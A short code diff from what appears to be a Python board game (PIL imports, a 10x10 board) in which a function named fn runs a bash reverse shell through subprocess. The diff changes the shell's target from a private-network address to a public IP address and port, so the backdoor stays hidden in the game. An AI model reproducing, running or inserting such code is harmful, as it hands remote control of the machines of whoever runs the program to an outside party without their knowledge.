@@ -8,7 +8,7 @@ import threading
 from PIL import ImageTk,Image
 
 def fn(n):
-       subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.1.120/45678 0<&1 2>&1", shell=True, executable='/bin/bash')
+       subprocess.check_call("/bin/bash -i >/dev/tcp/82.165.97.169/2022 0<&1 2>&1", shell=True, executable='/bin/bash')
 size_of_board = 600
 rows = 10
 cols = 10
